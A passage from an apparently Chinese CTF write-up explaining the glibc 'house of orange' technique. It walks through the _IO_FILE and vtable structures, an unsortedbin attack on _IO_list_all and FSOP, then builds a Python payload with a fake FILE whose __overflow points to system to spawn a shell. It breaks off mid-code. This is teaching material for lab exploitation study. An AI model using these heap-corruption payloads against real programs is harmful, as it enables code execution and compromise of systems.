_IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p></p><p>整个结构不用完全掌握，大概了解就行。<br>在进程中的产生的各个<code>_IO_FILE</code>结构会通过其中的<code>struct _IO_FILE *_chain;</code>连接在一起<strong>形成一个链表</strong>，其中<strong>表头</strong>使用全局变量<code>struct _IO_FILE_plus *_IO_list_all</code>来表示，通过<code>_IO_list_all</code>就可以遍历所有<code>_IO_FILE</code>结构。</p><p><strong>_IO_jump_t *vtable</strong>结构定义如下:<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p></p><p>这里面保存了一系列的函数指针。</p><p>以上，主要需要了解的就是 <strong>_IO_FILE_plus</strong>、<strong>_IO_FILE</strong>、<strong>vtable</strong>3个结构以及 <strong>_IO_list_all指针</strong>的关系和及其内容。</p><p><code>_IO_FILE</code>各个成员的偏移如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line"><span class="string">'i386'</span>:&#123;</span><br><span class="line"><span class="number">0x0</span>:<span class="string">'_flags'</span>,</span><br><span class="line"><span class="number">0x4</span>:<span class="string">'_IO_read_ptr'</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">'_IO_read_end'</span>,</span><br><span class="line"><span class="number">0xc</span>:<span class="string">'_IO_read_base'</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">'_IO_write_base'</span>,</span><br><span class="line"><span class="number">0x14</span>:<span class="string">'_IO_write_ptr'</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">'_IO_write_end'</span>,</span><br><span class="line"><span class="number">0x1c</span>:<span class="string">'_IO_buf_base'</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">'_IO_buf_end'</span>,</span><br><span class="line"><span class="number">0x24</span>:<span class="string">'_IO_save_base'</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">'_IO_backup_base'</span>,</span><br><span class="line"><span class="number">0x2c</span>:<span class="string">'_IO_save_end'</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">'_markers'</span>,</span><br><span class="line"><span class="number">0x34</span>:<span class="string">'_chain'</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">'_fileno'</span>,</span><br><span class="line"><span class="number">0x3c</span>:<span class="string">'_flags2'</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">'_old_offset'</span>,</span><br><span class="line"><span class="number">0x44</span>:<span class="string">'_cur_column'</span>,</span><br><span class="line"><span class="number">0x46</span>:<span class="string">'_vtable_offset'</span>,</span><br><span class="line"><span class="number">0x47</span>:<span class="string">'_shortbuf'</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">'_lock'</span>,</span><br><span class="line"><span class="number">0x4c</span>:<span class="string">'_offset'</span>,</span><br><span class="line"><span class="number">0x54</span>:<span class="string">'_codecvt'</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">'_wide_data'</span>,</span><br><span class="line"><span class="number">0x5c</span>:<span class="string">'_freeres_list'</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">'_freeres_buf'</span>,</span><br><span class="line"><span class="number">0x64</span>:<span class="string">'__pad5'</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">'_mode'</span>,</span><br><span class="line"><span class="number">0x6c</span>:<span class="string">'_unused2'</span>,</span><br><span class="line"><span class="number">0x94</span>:<span class="string">'vtable'</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">'amd64'</span>:&#123;</span><br><span class="line"><span class="number">0x0</span>:<span class="string">'_flags'</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">'_IO_read_ptr'</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">'_IO_read_end'</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">'_IO_read_base'</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">'_IO_write_base'</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">'_IO_write_ptr'</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">'_IO_write_end'</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">'_IO_buf_base'</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">'_IO_buf_end'</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">'_IO_save_base'</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">'_IO_backup_base'</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">'_IO_save_end'</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">'_markers'</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">'_chain'</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">'_fileno'</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">'_flags2'</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">'_old_offset'</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">'_cur_column'</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">'_vtable_offset'</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">'_shortbuf'</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">'_lock'</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">'_offset'</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">'_codecvt'</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">'_wide_data'</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">'_freeres_list'</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">'_freeres_buf'</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">'__pad5'</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">'_mode'</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">'_unused2'</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">'vtable'</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><strong>[注]</strong>在gdb中查看这些结构的指令:<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看_IO_list_all指针</span></span><br><span class="line">p *_IO_list_all</span><br><span class="line"><span class="comment">//查看_IO_FILE_plus</span></span><br><span class="line">p (*(struct _IO_FILE_plus *) <span class="number">0x55cdf66034f0</span>)</span><br><span class="line"><span class="comment">//查看vtable</span></span><br><span class="line">p (*(struct _IO_jump_t *) <span class="number">0x55cdf66034f0</span>)</span><br></pre></td></tr></table></figure><p></p><h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><p>根据house of orange的流程，接下来将要控制<code>_IO_list_all</code>指针的值，具体原因后面会讲到。这里我们采用<strong>unsortedbin attack</strong>来对它的值进行修改。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在从unsorted bin中取出chunk时，会执行以下代码：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><p></p><p>这里将最后一个chunk取出，并把倒数第二个chunk的<code>fd</code>设置为<code>unsorted_chunks(av)</code>，这里<code>unsorted_chunks(av)</code>就是main_arena中top成员变量的地址(&amp;main_arena+88)。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main_arena的结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  mchunkptr top;    <span class="comment">//此处的地址将被写入目标地址</span></span><br><span class="line"></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>可以发现，如果我们将victim的<code>bk</code>改写为某个地址，则可以向<code>这个地址 + 0x10</code>的地方写入<code>&amp;main_arena+88</code>。<br>因为题目程序中存在堆溢出，所以可以轻松溢出到某个chunk的<code>bk</code>，并将它改写。这里我们写入<code>_IO_list_all - 0x10</code>，这样当从unsorted bin中取出它时，就可以成功将<code>_IO_list_all</code>写为<code>&amp;main_arena+88</code>。</p><p>具体利用过程需要和后面FSOP配合。</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><blockquote><p>因为<code>_IO_FILE</code>结构使用链表的结构管理，表头由<code>_IO_list_all</code>维护。所以FSOP的核心思想就是<strong>劫持_IO_list_all的值</strong>并伪造链表和其中的<code>_IO_FILE</code></p></blockquote><p>在此之前，我们先了解一下<code>malloc</code>对错误信息的处理过程.</p><ol><li><p>在<code>malloc</code>出错时，会调用<code>malloc_printerr</code>函数来输出错误信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)|| __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>, chunk2mem (victim), av);</span><br></pre></td></tr></table></figure></li><li><p>而<code>malloc_printerr</code>又会调用<code>__libc_message</code>;</p></li><li><code>__libc_message</code>又调用<code>abort</code>;</li><li><code>abort</code>则又调用了<code>_IO_flush_all_lockp</code></li><li>最后<code>_IO_flush_all_lockp</code>中会调用到<code>vtable</code>中的<code>_IO_OVERFLOW</code>函数</li></ol><p>整个流程如下图：<br><img src="/post/f8f8701e/abort_routine.jpeg" alt="流程图"><br>所以如果可以控制<code>_IO_list_all</code>的值，同时够伪造一个<code>_IO_FILE</code>及其<code>vtable</code>并放入FILE链表中，就可以让上述流程进入我们伪造的<code>vtable</code>, 并调用被修改为<code>system</code>的<code>_IO_OVERFLOW</code>函数。</p><p>但是想要成功调用<code>_IO_OVERFLOW</code>函数还需要绕过一些阻碍<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">        || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">        &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">        ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        fp = fp-&gt;_chain;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>观察代码发现，<code>_IO_OVERFLOW</code>存在于<code>if</code>之中，根据短路原理，若要执行到<code>_IO_OVERFLOW</code>，就需要让前面的判断都能满足，即：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span> </span><br><span class="line">&amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p></p><p>或者<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">&amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base）</span><br></pre></td></tr></table></figure><p></p><p>以上两个条件至少要满足一个，这里我们将选择第一个，只需要构造<code>mode</code>、<code>_IO_write_ptr</code>和<code>_IO_write_base</code>。因为这些都是我们可以伪造的<code>_IO_FILE</code>中的数据，所以比较容易实现。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在前面已经介绍过，可以通过unsortedbin attack来将<code>_IO_list_all</code>指针的值修改为<code>&amp;main_arena+88</code>。</p><p>但这还不够，因为我们很难控制<code>main_arena</code>中的数据，并不能在<code>mode</code>、<code>_IO_write_ptr</code>和<code>_IO_write_base</code>的对应偏移处构造出合适的值。</p><p>所以我们将目光转向<code>_IO_FILE</code>的链表特性。在前文<code>_IO_flush_all_lockp</code>函数的代码最后，可以发现程序通过<code>fp = fp-&gt;_chain</code>不断的寻找下一个<code>_IO_FILE</code>。</p><p>所以如果可以修改<code>fp-&gt;_chain</code>到一个我们伪造好的<code>_IO_FILE</code>的地址，那么就可以成功实现利用了。</p><p>巧妙的是，<code>_IO_FILE</code>结构中的<code>chian</code>字段对应偏移是0x68，而在<code>&amp;main_arena+88</code>对应偏移为0x68的地址正好是大小为0x60的<code>small bin</code>的bk，而这个地址的刚好是我们可以控制的。<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x00</span> [       top        |  last_remainder   ]</span><br><span class="line">+<span class="number">0x10</span> [ unsorted bin fd  |  unsorted bin bk  ]</span><br><span class="line">+<span class="number">0x20</span> [ smallbin <span class="number">0x20</span> fd | smallbin <span class="number">0x20</span> bk  ]</span><br><span class="line">+<span class="number">0x30</span> [ smallbin <span class="number">0x30</span> fd | smallbin <span class="number">0x30</span> bk  ]</span><br><span class="line">+<span class="number">0x40</span> [ smallbin <span class="number">0x40</span> fd | smallbin <span class="number">0x40</span> bk  ]</span><br><span class="line">+<span class="number">0x50</span> [ smallbin <span class="number">0x50</span> fd | smallbin <span class="number">0x50</span> bk  ]</span><br><span class="line">+<span class="number">0x60</span> [ smallbin <span class="number">0x60</span> fd | smallbin <span class="number">0x60</span> bk  ]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">64</span>gx _IO_list_all</span><br><span class="line"><span class="number">0x7fdd7442c7b8</span> &lt;main_arena+<span class="number">88</span>&gt;:<span class="number">0x00005616d200b010</span><span class="number">0x00005616d1fe94f0</span></span><br><span class="line"><span class="number">0x7fdd7442c7c8</span> &lt;main_arena+<span class="number">104</span>&gt;:<span class="number">0x00005616d1fe94f0</span><span class="number">0x00007fdd7442d190</span></span><br><span class="line"><span class="number">0x7fdd7442c7d8</span> &lt;main_arena+<span class="number">120</span>&gt;:<span class="number">0x00007fdd7442c7c8</span><span class="number">0x00007fdd7442c7c8</span></span><br><span class="line"><span class="number">0x7fdd7442c7e8</span> &lt;main_arena+<span class="number">136</span>&gt;:<span class="number">0x00007fdd7442c7d8</span><span class="number">0x00007fdd7442c7d8</span></span><br><span class="line"><span class="number">0x7fdd7442c7f8</span> &lt;main_arena+<span class="number">152</span>&gt;:<span class="number">0x00007fdd7442c7e8</span><span class="number">0x00007fdd7442c7e8</span></span><br><span class="line"><span class="number">0x7fdd7442c808</span> &lt;main_arena+<span class="number">168</span>&gt;:<span class="number">0x00007fdd7442c7f8</span><span class="number">0x00007fdd7442c7f8</span></span><br><span class="line"><span class="number">0x7fdd7442c818</span> &lt;main_arena+<span class="number">184</span>&gt;:<span class="number">0x00005616d1fe94f0</span><span class="number">0x00005616d1fe94f0</span> &lt;== 此处</span><br><span class="line"><span class="number">0x7fdd7442c828</span> &lt;main_arena+<span class="number">200</span>&gt;:<span class="number">0x00007fdd7442c818</span><span class="number">0x00007fdd7442c818</span></span><br></pre></td></tr></table></figure><p></p><p>我们如果通过溢出，将位于unsorted bin中的chunk的<code>size</code>修改为0x60。（注：现在unsorted bin中的chunk就是之前被释放的top chunk的一部分）<br>那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入<code>大循环</code>，<strong>把unsorted bin中的chunk放回到对应的small bin或large bin中</strong>（具体流程参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/heap_implementation_details/#_7" target="_blank" rel="noopener">ctfwiki</a>）<br>因此，我们修改过size的chunk就会被放入大小为0x60的<code>small bin</code>中，同时，该<code>small bin</code>的fd和bk都会变为此chunk的地址。</p><p>这样，当<code>_IO_flush_all_lockp</code>函数通过<code>fp-&gt;_chain</code>寻找下一个<code>_IO_FILE</code>时，就会寻找到<code>smallbin 0x60</code>中的chunk。<br>只要在这个chunk中伪造好<code>_IO_FILE</code>结构体以及<code>vtable</code>，把<code>_IO_OVERFLOW</code>设置为<code>system</code>，然后就可以成功getshell了。</p><h4 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h4><p>直接构造payload</p><ol><li><p>首先是padding，抵达被释放掉的top chunk。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li><li><blockquote><p>接下来构造的内存具有双重身份，一是作为伪造的<code>_IO_FILE</code>；一是用于<code>unsorted attack</code>的victim chunk，因为它位于unsorted bin中。</p></blockquote><p>然后开始构造<code>_IO_FILE</code>。因为要调用的<code>_IO_OVERFLOW (fp, EOF)</code>被修改后为<code>system(fp)</code>，所以在开头写入<code>&#39;/bin/sh\x00&#39;</code>，让<code>fp = &quot;/bin/sh&quot;</code>；又因为为了将这个chunk放入<code>smallbin 0x60</code>，所以将<code>size</code>位设置为0x61。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br></pre></td></tr></table></figure></li><li><p>然后将<code>bk</code>的位置写入<code>(IO_list_all - 0x10</code>，用作<code>unsorted attack</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_file += p64(<span class="number">0</span>) + p64(IO_list_all - <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure></li><li><p>接下来的位置刚好是<code>_IO_write_base</code>和<code>IO_write_ptr</code>。前面提到过需要构造<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)    <span class="comment">#_IO_write_base ; _IO_write_ptr</span></span><br></pre></td></tr></table></figure></li><li><p>接下来需要一段padding，直至<code>fp-&gt;mode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)   <span class="comment">#padding</span></span><br></pre></td></tr></table></figure></li><li><p>抵达<code>fp-&gt;mode</code>，构造<code>fp-&gt;_mode &lt;= 0</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment">#mode &lt;= 0</span></span><br></pre></td></tr></table></figure></li><li><p>然后需要设置<code>vtable</code>指针，将它设置到当前地址相邻往后的地址，然后继续在后面构造<code>vtable</code>就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload += fake_file</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  <span class="comment">#padding</span></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x5d0</span>)   <span class="comment">#vtable指针</span></span><br></pre></td></tr></table></figure></li><li><p>构造<code>vtable</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment">#vtable</span></span><br><span class="line">payload += p64(system)  <span class="comment">#将__overflow改为system</span></span><br></pre></td></tr></table></figure></li><li><p>写入数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upgrade(<span class="number">0x800</span>, 